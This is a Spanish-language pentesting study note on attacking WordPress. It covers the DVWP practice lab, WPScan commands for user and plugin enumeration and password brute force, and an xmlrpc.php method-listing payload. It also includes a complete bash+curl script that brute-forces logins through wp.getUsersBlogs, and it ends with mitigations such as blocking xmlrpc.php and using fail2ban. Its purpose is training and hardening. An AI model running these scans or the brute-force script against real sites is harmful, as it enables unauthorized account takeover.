## 📚 **Índice**

- [[#🧩 ¿Qué es WordPress y por qué es tan atacado?]]
- [[#🧪 Laboratorio DVWP para prácticas]]
- [[#🛠️ WPScan — Escáner oficial de WordPress]]
- [[#🔍 Enumeración real con WPScan (usuarios, plugins, temas)]]
- [[#⚡ Fuerza bruta con WPScan]]
- [[#📡 xmlrpcphp — Qué es y por qué es tan peligroso]]
- [[#💣 Ataques reales contra xmlrpcphp]]
- [[#📜 Fuerza bruta con Bash + curl usando wpgetUsersBlogs]]
- [[#🧠 Otros métodos XMLRPC explotables]]
- [[#🛡️ Cómo mitigar estas vulnerabilidades]]

---

# 🧩 **¿Qué es WordPress y por qué es tan atacado?**

**WordPress** (2003) es el CMS más usado del mundo.  
Su éxito = su debilidad:

- Millones de instalaciones → enorme superficie de ataque
    
- Miles de plugins con bugs
    
- Temas vulnerables
    
- Usuarios con contraseñas débiles
    
- xmlrpc.php expuesto
    
- APIs subdocumentadas
    
- Panel de administración accesible
    

Para un atacante, WordPress siempre será un objetivo atractivo.

---

# 🧪 **Laboratorio DVWP para prácticas**

Proyecto vulnerable:

➡ **DVWP (Damn Vulnerable WordPress)**  
[https://github.com/vavkamil/dvwp](https://github.com/vavkamil/dvwp)

Incluye:

- Plugins vulnerables
    
- Temas débiles
    
- Usuarios previsibles
    
- xmlrpc.php activo
    
- Escenarios reales para pentesting WP
    

Perfecto para OSCP, prácticas y CTFs.

---

# 🛠️ **WPScan — Escáner oficial de WordPress**

WPScan es la herramienta estándar para:

- Enumerar usuarios
    
- Detectar plugins vulnerables
    
- Obtener versión del core
    
- Identificar configuraciones inseguras
    
- Probar contraseñas débiles
    

Sintaxis básica:

```bash
wpscan --url https://example.com
```

WPScan usa la base de datos oficial de vulnerabilidades de WordPress:  
[https://wpscan.com](https://wpscan.com/)

---

# 🔍 **Enumeración real con WPScan**

### ➤ Enumerar usuarios:

```bash
wpscan --url https://example.com --enumerate u
```

WPScan detecta:

- Usuarios publicados en posts
    
- Usuarios filtrados por REST API
    
- Usuarios expuestos por author-id
    
- Usuarios que aparezcan en sitemaps
    
- Usuarios en feeds RSS
    

### ➤ Enumerar plugins vulnerables:

```bash
wpscan --url https://example.com --enumerate vp
```

“vp” = vulnerable plugins  
WPScan identifica:

- Versiones desactualizadas
    
- CVEs con exploit público
    
- Zero-days conocidos
    
- Backdoors comunes
    

---

# ⚡ **Fuerza bruta con WPScan**

Comando estándar:

```bash
wpscan --url https://example.com -U admin -P diccionario.txt
```

WPScan hace:

- Peticiones al `/wp-login.php`
    
- Maneja cookies, tokens, nonces
    
- Detecta bloqueos, captchas, rate-limit
    
- Identifica respuestas válidas
    

---

# 📡 **xmlrpc.php — Qué es y por qué es tan peligroso**

`xmlrpc.php` es un endpoint que WordPress usa para:

- Comunicarse con apps móviles
    
- Publicar posts remotamente
    
- Conectar servicios externos
    
- Administrar contenido vía API XML-RPC
    

Problema:  
👉 **Permite cientos o miles de intentos de login en una sola petición.**  
👉 Sin rate-limiting.  
👉 Sin bloquear al atacante.

Por eso es un vector de fuerza bruta MUCHO MÁS EFECTIVO que `/wp-login.php`.

### Cómo verificar si existe:

```
https://example.com/xmlrpc.php
```

Si responde algo como:

```
XML-RPC server accepts POST requests only.
```

SIGNIFICA:

🟥 Está habilitado  
🟥 Acepta POST  
🟥 Es vulnerable a abuso

---

# 💣 **Ataques reales contra xmlrpc.php**

### 1️⃣ Enumerar métodos habilitados

Usamos curl enviando un XML malicioso:

```bash
curl -s -X POST "https://example.com/xmlrpc.php" -d @payload.xml
```

Payload básico:

```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
</methodCall>
```

Esto fuerza al servidor a mostrar TODOS los métodos disponibles, incluyendo:

- `wp.getUsersBlogs`
    
- `wp.getAuthors`
    
- `wp.getCategories`
    
- `wp.getUsers`
    
- `demo.sayHello`
    

Muchos revelan información sensible.

---

# 📜 **Fuerza bruta con Bash + curl usando wp.getUsersBlogs**

Creamos un archivo XML dinámico para probar usuario/contraseña.

Script (bash):

```bash
#!/bin/bash

URL="https://example.com/xmlrpc.php"
USER="admin"
WORDLIST="passwords.txt"

while read PASS; do
    XML="<?xml version=\"1.0\"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value>$USER</value></param>
    <param><value>$PASS</value></param>
  </params>
</methodCall>"

    RESPONSE=$(curl -s -d "$XML" -H "Content-Type: text/xml" $URL)

    if ! echo "$RESPONSE" | grep -q "incorrect username or password"; then
        echo "[+] VALID CREDENTIALS → $USER:$PASS"
        exit 0
    else
        echo "[-] Invalid: $USER:$PASS"
    fi
done < $WORDLIST
```

**Cómo funciona:**

- Envía múltiples combinaciones de user/pass
    
- Si la respuesta cambia → credenciales válidas
    
- Mucho más efectivo que login clásico
    

---

# 🧠 **Otros métodos XML-RPC explotables**

### 🔥 `wp.getUsers`

Puede filtrar usuarios completos si un plugin lo deja abierto.

### 🔥 `wp.getAuthors`

Permite enumerar cuentas.

### 🔥 `wp.getComments`

Puede permitir scraping de información interna.

### 🔥 `system.multicall`

El más peligroso:

👉 Permite intentar **cientos de passwords en una sola petición POST**.  
WPScan lo detecta explícitamente en sus análisis.

---

# 🛡️ **Cómo mitigar estas vulnerabilidades**

### 1. Desactivar xmlrpc.php (lo más recomendable)

En `.htaccess`:

```apache
<Files xmlrpc.php>
  Order Allow,Deny
  Deny from all
</Files>
```

### 2. Activar plugins de protección

Ejemplo: “Disable XML-RPC”.

### 3. Deshabilitar multicall

Evita ataques masivos de fuerza bruta.

### 4. Activar rate-limiting con fail2ban

### 5. Restringir panel `/wp-admin` por IP en sites corporativos

---

# 🎯 **Conclusión PRO**

WordPress es potente, pero fácil de romper si:

- xmlrpc.php está habilitado
    
- Plugins están desactualizados
    
- Usuarios tienen contraseñas débiles
    
- No hay hardening real
    

WPScan + xmlrpc.php = **combinación perfecta para un atacante**.

Para un pentester, esto te da:

- Enumeración precisa
    
- Fuerza bruta eficiente
    
- Reconocimiento profundo
    
- Vector realista de compromiso
    

---
